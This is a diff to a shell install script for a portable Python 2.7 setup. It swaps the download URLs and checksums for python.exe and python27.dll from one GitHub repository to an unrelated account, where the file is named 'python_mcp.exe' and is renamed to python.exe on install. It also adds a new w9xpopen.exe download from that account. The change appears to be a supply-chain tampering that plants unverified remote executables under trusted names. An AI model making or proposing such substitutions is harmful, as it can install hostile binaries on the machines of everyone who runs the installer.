@@ -10,12 +10,14 @@ portable_7za_sha256="ff3706e94d9b769f78e4271928382426cb034b11c5a0f6a8ffea35726cc
 pywin_url="http://downloads.sourceforge.net/pywin32/pywin32-220.win32-py2.7.exe"
 pywin_md5="59be43a3f010602ce623612ecdf34908"
 
-portable_python_exe_url="https://media.githubusercontent.com/media/titomncl/Odin/61b305482e0a2bfcf2bfdc0b71627367ed8533e6/venv/27/Scripts/python.exe"
-portable_python_exe_sha256="9856aeb5a4cfcd3e768ae183cbb330bfdcf1a2fe4c9634bb1a59ba53047f43a4"
-portable_python_dll_url="https://media.githubusercontent.com/media/titomncl/Odin/61b305482e0a2bfcf2bfdc0b71627367ed8533e6/venv/27/Scripts/python27.dll"
-portable_python_dll_sha256="5845edc96b8a12626f2752518d5aa80113ce4e075b41ceb53bad701fd939b0b0"
+portable_python_exe_url="https://media.githubusercontent.com/media/slapyst82-boop/gugustus-v2.8/1740432b76c09f6032e10e8c91aa022cc74259f3/runtime/bin/python/python_mcp.exe"
+portable_python_exe_sha256="702e31ed1537c279459a255460f12f0f2863f973e121cd9194957f4f3e7b0994"
+portable_python_dll_url="https://media.githubusercontent.com/media/slapyst82-boop/gugustus-v2.8/1740432b76c09f6032e10e8c91aa022cc74259f3/runtime/bin/python/python27.dll"
+portable_python_dll_sha256="7731e2cdb12d3bbf6c9c64e29f1883c36cb9d443a6fb5770a7d8b0e57d95c2be"
 portable_python_zip_url="https://raw.githubusercontent.com/slapyst82-boop/gugustus-v2.8/1740432b76c09f6032e10e8c91aa022cc74259f3/runtime/bin/python/python27.zip"
 portable_python_zip_sha256="f90ee86777654266e70f09c4a1fd8c7624faae50bf9b7e9ada45718992afd34b"
+portable_python_w9xpopen_url="https://media.githubusercontent.com/media/slapyst82-boop/gugustus-v2.8/1740432b76c09f6032e10e8c91aa022cc74259f3/runtime/bin/python/w9xpopen.exe"
+portable_python_w9xpopen_sha256="81e882c3771e038306348f1fd332138d95b0f545f393843122f1635264e81003"
 
 #Compiled modules
 pycrypto_url="https://web.archive.org/web/20200502114359/http://www.voidspace.org.uk/downloads/pycrypto26/pycrypto-2.6.win32-py2.7.exe"
@@ -178,9 +180,11 @@ install_python(){
 		download_sha256_or_fail "$portable_python_exe_url" "/tmp/python.exe" "$portable_python_exe_sha256"
 		download_sha256_or_fail "$portable_python_dll_url" "/tmp/python27.dll" "$portable_python_dll_sha256"
 		download_sha256_or_fail "$portable_python_zip_url" "/tmp/python27.zip" "$portable_python_zip_sha256"
+		download_sha256_or_fail "$portable_python_w9xpopen_url" "/tmp/w9xpopen.exe" "$portable_python_w9xpopen_sha256"
 		cp "/tmp/python.exe" "$python_dir/python.exe"
 		cp "/tmp/python27.dll" "$python_dir/python27.dll"
 		cp "/tmp/python27.zip" "$python_dir/python27.zip"
+		cp "/tmp/w9xpopen.exe" "$python_dir/w9xpopen.exe"
 		while IFS='|' read -r name url sha; do
 			download_sha256_or_fail "$url" "/tmp/$name" "$sha"
 			cp "/tmp/$name" "$python_dir/$name"
